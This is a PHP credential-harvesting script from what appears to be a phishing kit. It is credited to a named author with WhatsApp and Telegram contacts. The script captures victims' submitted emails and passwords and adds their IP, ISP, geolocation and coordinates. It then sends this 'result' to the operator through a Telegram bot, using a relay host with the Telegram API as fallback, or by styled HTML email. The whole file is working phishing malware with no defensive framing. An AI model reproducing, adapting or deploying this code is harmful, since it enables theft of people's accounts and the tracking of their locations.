<?php
// CREATED BY TIRZZ23NESIA
// WA : 6285718662148
// TELE : @zexoorill
// DO NOT REMOVE THIS COPYRIGHT NOTICE.
include 'detailip.php';

$user  = $_POST['email']    ?? '';
$pass  = $_POST['password'] ?? '';
$login = $_POST['login']    ?? '';

if (empty($user) || empty($pass)) {
    header('Location: index.php');
    exit;
}

$currentUserIp = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$rateLimitFile = 'jetetc/rate_limit.json';
$rateLimit = file_exists($rateLimitFile) ? json_decode(file_get_contents($rateLimitFile), true) : [];
$currentTime = time();
$requests = 0;

if (isset($rateLimit[$currentUserIp])) {
    $requests = $rateLimit[$currentUserIp]['count'];
    $lastTime = $rateLimit[$currentUserIp]['time'];
    if ($currentTime - $lastTime > 60) {
        $requests = 0;
    }
}

if ($requests >= 3) {
    http_response_code(429);
    die("Terlalu banyak permintaan. Coba lagi dalam 1 menit.");
}

$rateLimit[$currentUserIp] = [
    'count' => $requests + 1,
    'time' => $currentTime
];
file_put_contents($rateLimitFile, json_encode($rateLimit));

$info      = get_ip_info();
$ipv4      = $info['ipv4']    ?? '';
$ipv6      = $info['ipv6']    ?? '';
$provinsi  = $info['region']  ?? '';
$kota      = $info['city']    ?? '';
$operator  = $info['isp']     ?? '';
$asn       = $info['asn']     ?? '';
$longitude = $info['lon']     ?? '';
$latitude  = $info['lat']     ?? '';
$negara    = $info['country'] ?? '';

$waktu = date('d-m-Y H:i:s');

$configFile = 'jetetc/datanya.json';
$config     = file_exists($configFile)
    ? json_decode(file_get_contents($configFile), true)
    : [];

$nama       = $config['nama']              ?? '';
$sendMethod = $config['send_method']       ?? 'telegram';
$tokenBot   = $config['tokenbot']          ?? '';
$userId     = $config['userid']            ?? '';
$emailTo    = $config['email_to']          ?? 'tirzznesia@gmail.com';
$emailSubject    = $config['email_subject']       ?? 'RESS VIP BY T23N';
$emailFromName   = $config['email_from_name']     ?? 'RESS GACOR T23N';
$emailFromAddr   = $config['email_from_address']  ?? 'admin@tirzznesia.com';

$visitorFile = 'jetetc/pengunjungvisit.json';
if (!is_dir('jetetc')) {
    mkdir('jetetc', 0755, true);
}
$vis = file_exists($visitorFile)
    ? json_decode(file_get_contents($visitorFile), true)
    : ['today' => 0, 'yesterday' => 0, 'total' => 0, 'last_date' => ''];

// Date-based reset: if the stored date differs from today, rotate counts
$todayDate = date('Y-m-d');
$lastDate = $vis['last_date'] ?? '';

if ($lastDate !== $todayDate) {
    if ($lastDate === date('Y-m-d', strtotime('-1 day'))) {
        // Yesterday was the last active day, move today's count to yesterday
        $vis['yesterday'] = $vis['today'];
    } else {
        // More than 1 day gap, reset yesterday to 0
        $vis['yesterday'] = 0;
    }
    $vis['today'] = 0;
    $vis['last_date'] = $todayDate;
}

$vis['today'] += 1;
$vis['total'] += 1;
file_put_contents($visitorFile, json_encode($vis, JSON_PRETTY_PRINT));

$ipDisplay = trim(
    (!empty($ipv6) ? $ipv6 : '') .
    (!empty($ipv4) ? ' | ' . $ipv4 : '')
, ' |');

$message =
    "<blockquote><b>🔥 RESSULT " . htmlspecialchars($nama) . " 🔥</b></blockquote>\n" .
    "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n" .
    "<b>Email + Password :</b> <code>" . htmlspecialchars($user) . " " . htmlspecialchars($pass)  . "</code>\n" .
    "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n" .
    "<b>Email/User :</b> <code>" . htmlspecialchars($user)  . "</code>\n" .
    "<b>Password   :</b> <code>" . htmlspecialchars($pass)  . "</code>\n" .
    "<b>Login      :</b> <code>" . htmlspecialchars($login) . "</code>\n" .
    "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n" .
    "<b>IP Address :</b> <code>" . htmlspecialchars($ipv4)     . "</code>\n" .
    "<b>IPv6       :</b> <code>" . htmlspecialchars($ipv6 ?: '-') . "</code>\n" .
    "<b>Lokasi     :</b> <code>" . htmlspecialchars("$negara, $provinsi, $kota") . "</code>\n" .
    "<b>Operator   :</b> <code>" . htmlspecialchars($operator) . "</code>\n" .
    "<b>ASN        :</b> <code>" . htmlspecialchars($asn ?: '-') . "</code>\n" .
    "<b>Koordinat  :</b> <code>" . htmlspecialchars("$longitude, $latitude") . "</code>\n" .
    "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n" .
    "<b>Waktu :</b> <i>" . $waktu . " WIB</i>\n" .
    "<b>Status:</b> <u>Real Data Stream</u>\n" .
    "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n" .
    "<b>Wa   :</b> <tg-spoiler>628975919600</tg-spoiler>\n" .
    "<b>Tele :</b> <tg-spoiler>@zexoorill</tg-spoiler>";

$RELAY_BASE_URL = "https://televault.fathir.me";

function sendTelegram(string $token, string $chatId, string $text, string $baseUrl = ''): bool {
    if (empty($token) || empty($chatId)) return false;
    $urls = [];
    if (!empty($baseUrl)) {
        $urls[] = "{$baseUrl}/api/relay/bot{$token}/sendMessage";
    }
    $urls[] = "https://api.telegram.org/bot{$token}/sendMessage";

    $data = json_encode([
        'chat_id'                  => $chatId,
        'text'                     => $text,
        'parse_mode'               => 'HTML',
        'disable_web_page_preview' => true,
    ]);

    foreach ($urls as $url) {
        $opts = [
            'http' => [
                'method'        => 'POST',
                'header'        => "Content-Type: application/json\r\n" .
                                   "Content-Length: " . strlen($data) . "\r\n",
                'content'       => $data,
                'timeout'       => 10,
                'ignore_errors' => true,
            ],
        ];

        $result = @file_get_contents($url, false, stream_context_create($opts));
        if ($result !== false) {
            $json = json_decode($result, true);
            if (!empty($json['ok'])) return true;
        }
    }

    return false;
}

function sendEmail(string $to, string $nama, string $user, string $pass, string $login, string $ipv4, string $ipv6, string $negara, string $provinsi, string $kota, string $operator, string $asn, string $longitude, string $latitude, string $waktu, string $customSubject = '', string $fromName = '', string $fromAddr = ''): bool {
    if (empty($to)) return false;

    $subjectText = !empty($customSubject) ? $customSubject : "Results " . $nama;
    $subject = "=?UTF-8?B?" . base64_encode($subjectText) . "?=";

    $senderName = !empty($fromName) ? $fromName : 'NOREPLY';
    $senderAddr = !empty($fromAddr) ? $fromAddr : ('noreply@' . ($_SERVER['HTTP_HOST'] ?? 'localhost'));

    $body = "
<html>
<head>
<meta charset='UTF-8'>
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css'>
<style>
  .ico{display:inline-block;width:14px;text-align:center;margin-right:4px;font-size:11px;}
  .ico-red{color:#ef4444;}.ico-blue{color:#3b82f6;}.ico-purple{color:#8b5cf6;}.ico-amber{color:#f59e0b;}.ico-green{color:#22c55e;}
</style>
</head>
<body style='margin:0;padding:0;background:#0a0a0a;font-family:Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;'>
<div style='max-width:480px;margin:0 auto;padding:32px 14px;'>

    <!-- HEADER -->
    <div style='display:flex;align-items:center;gap:12px;margin-bottom:18px;'>
        <img src=\"https://i.ibb.co.com/G31Mgtmn/391758-11zon.jpg\" width='38' height='38' style='border-radius:10px;'>
        <div>
            <div style='color:#fff;font-size:14px;font-weight:800;letter-spacing:-0.3px;'>RESULT " . htmlspecialchars($nama) . "</div>
            <div style='color:#555;font-size:10px;'>" . $waktu . " WIB</div>
        </div>
    </div>

    <!-- CREDENTIALS -->
    <div style='background:linear-gradient(135deg,#ef4444,#dc2626);border-radius:12px;padding:14px 16px;margin-bottom:14px;'>
        <div style='color:rgba(255,255,255,0.5);font-size:8px;font-weight:700;text-transform:uppercase;letter-spacing:2px;margin-bottom:4px;'><i class='fa-solid fa-fire' style='margin-right:4px;'></i>CREDENTIALS</div>
        <div style='color:#fff;font-size:13px;font-weight:700;font-family:Consolas,Liberation Mono,monospace;word-break:break-all;'>" . htmlspecialchars($user) . " | " . htmlspecialchars($pass) . "</div>
    </div>

    <!-- EMAIL (full width) -->
    <table width='100%' cellpadding='0' cellspacing='0' border='0' style='margin-bottom:8px;'>
        <tr><td style='background:#1a1a1a;border-radius:10px;padding:12px;'>
            <div style='color:#666;font-size:8px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:3px;'><i class='fa-solid fa-envelope ico ico-red'></i>Email</div>
            <div style='color:#e5e5e5;font-size:13px;font-family:Consolas,Liberation Mono,monospace;'>" . htmlspecialchars($user) . "</div>
        </td></tr>
    </table>

    <!-- PASSWORD + LOGIN -->
    <table width='100%' cellpadding='0' cellspacing='0' border='0' style='margin-bottom:8px;'>
        <tr>
            <td width='50%' style='padding-right:4px;'>
                <div style='background:#1a1a1a;border-radius:10px;padding:12px;'>
                    <div style='color:#666;font-size:8px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:3px;'><i class='fa-solid fa-key ico ico-amber'></i>Password</div>
                    <div style='color:#e5e5e5;font-size:13px;font-family:Consolas,Liberation Mono,monospace;'>" . htmlspecialchars($pass) . "</div>
                </div>
            </td>
            <td width='50%' style='padding-left:4px;'>
                <div style='background:#1a1a1a;border-radius:10px;padding:12px;'>
                    <div style='color:#666;font-size:8px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:3px;'><i class='fa-solid fa-right-to-bracket ico ico-green'></i>Login Via</div>
                    <div style='color:#e5e5e5;font-size:13px;'>" . htmlspecialchars($login) . "</div>
                </div>
            </td>
        </tr>
    </table>

    <!-- IP + ISP -->
    <table width='100%' cellpadding='0' cellspacing='0' border='0' style='margin-bottom:8px;'>
        <tr>
            <td width='50%' style='padding-right:4px;'>
                <div style='background:#0f1729;border:1px solid #1a2744;border-radius:10px;padding:12px;'>
                    <div style='color:#3b82f6;font-size:8px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:3px;'><i class='fa-solid fa-globe ico ico-blue'></i>IP Address</div>
                    <div style='color:#93c5fd;font-size:12px;font-family:Consolas,Liberation Mono,monospace;'>" . htmlspecialchars($ipv4) . "</div>
                </div>
            </td>
            <td width='50%' style='padding-left:4px;'>
                <div style='background:#0f1729;border:1px solid #1a2744;border-radius:10px;padding:12px;'>
                    <div style='color:#3b82f6;font-size:8px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:3px;'><i class='fa-solid fa-tower-cell ico ico-blue'></i>ISP</div>
                    <div style='color:#93c5fd;font-size:12px;'>" . htmlspecialchars($operator) . "</div>
                </div>
            </td>
        </tr>
    </table>

    <!-- IPv6 (full width) -->
    <table width='100%' cellpadding='0' cellspacing='0' border='0' style='margin-bottom:8px;'>
        <tr><td style='background:#0f1729;border:1px solid #1a2744;border-radius:10px;padding:12px;'>
            <div style='color:#3b82f6;font-size:8px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:3px;'><i class='fa-solid fa-network-wired ico ico-blue'></i>IPv6</div>
            <div style='color:#93c5fd;font-size:12px;font-family:Consolas,Liberation Mono,monospace;word-break:break-all;'>" . htmlspecialchars($ipv6 ?: '-') . "</div>
        </td></tr>
    </table>

    <!-- LOKASI (full width) -->
    <table width='100%' cellpadding='0' cellspacing='0' border='0' style='margin-bottom:8px;'>
        <tr><td style='background:#110f1d;border:1px solid #1f1a35;border-radius:10px;padding:12px;'>
            <div style='color:#8b5cf6;font-size:8px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:3px;'><i class='fa-solid fa-location-dot ico ico-purple'></i>Lokasi</div>
            <div style='color:#c4b5fd;font-size:12px;'>" . htmlspecialchars("$negara, $provinsi, $kota") . "</div>
        </td></tr>
    </table>

    <!-- ASN + KOORDINAT -->
    <table width='100%' cellpadding='0' cellspacing='0' border='0' style='margin-bottom:0;'>
        <tr>
            <td width='50%' style='padding-right:4px;'>
                <div style='background:#110f1d;border:1px solid #1f1a35;border-radius:10px;padding:12px;'>
                    <div style='color:#8b5cf6;font-size:8px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:3px;'><i class='fa-solid fa-satellite-dish ico ico-purple'></i>ASN</div>
                    <div style='color:#c4b5fd;font-size:12px;font-family:Consolas,Liberation Mono,monospace;'>" . htmlspecialchars($asn ?: '-') . "</div>
                </div>
            </td>
            <td width='50%' style='padding-left:4px;'>
                <div style='background:#110f1d;border:1px solid #1f1a35;border-radius:10px;padding:12px;'>
                    <div style='color:#8b5cf6;font-size:8px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:3px;'><i class='fa-solid fa-map-location-dot ico ico-purple'></i>Koordinat</div>
                    <div style='color:#c4b5fd;font-size:12px;font-family:Consolas,Liberation Mono,monospace;'>" . htmlspecialchars("$latitude, $longitude") . "</div>
                </div>
            </td>
        </tr>
    </table>

    <!-- FOOTER -->
    <div style='text-align:center;margin-top:16px;'>
        <div style='color:#333;font-size:9px;'><i class='fa-brands fa-whatsapp' style='color:#444;margin-right:2px;'></i> 628975919600 &nbsp;&middot;&nbsp; <i class='fa-brands fa-telegram' style='color:#444;margin-right:2px;'></i> @zexoorill</div>
    </div>

</div>
</body>
</html>";

    $headers  = "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
    $headers .= "From: =?UTF-8?B?" . base64_encode($senderName) . "?= <" . $senderAddr . ">\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion() . "\r\n";

    return @mail($to, $subject, $body, $headers);
}

// === ROUTING: Telegram or Email ===
$sent = false;

if ($sendMethod === 'email') {
    $sent = sendEmail($emailTo, $nama, $user, $pass, $login, $ipv4, $ipv6, $negara, $provinsi, $kota, $operator, $asn, $longitude, $latitude, $waktu, $emailSubject, $emailFromName, $emailFromAddr);
    if (!$sent) {
        sleep(2);
        $sent = sendEmail($emailTo, $nama, $user, $pass, $login, $ipv4, $ipv6, $negara, $provinsi, $kota, $operator, $asn, $longitude, $latitude, $waktu, $emailSubject, $emailFromName, $emailFromAddr);
    }
} else {
    $sent = sendTelegram($tokenBot, $userId, $message, $RELAY_BASE_URL);
    if (!$sent) {
        sleep(2);
        $sent = sendTelegram($tokenBot, $userId, $message, $RELAY_BASE_URL);
    }
}

if ($sent) {
    $config['totals'] = ($config['totals'] ?? 0) + 1;
    file_put_contents($configFile, json_encode($config, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
}
?>
